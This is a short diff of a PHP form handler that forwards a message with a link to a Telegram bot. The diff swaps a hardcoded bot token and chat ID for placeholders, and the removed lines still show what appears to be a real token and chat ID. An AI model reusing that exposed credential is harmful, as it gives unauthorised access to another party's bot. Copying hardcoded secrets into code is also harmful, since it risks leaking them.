@@ -144,10 +144,10 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $message .= "Link: $link";
 
     // Send notification to Telegram
-    $telegramUrl = "https://api.telegram.org/bot7095664056:AAGTjDudYkVraffCQfHrYZGiweTjgh48B3w/sendMessage";
+    $telegramUrl = "https://api.telegram.org/bothehehe/sendMessage";
     $telegramParams = [
     'parse_mode' => 'markdown',
-    'chat_id' => '1627790263',
+    'chat_id' => '11111',
     'text' => $message
     ];
     $telegramQuery = http_build_query($telegramParams);
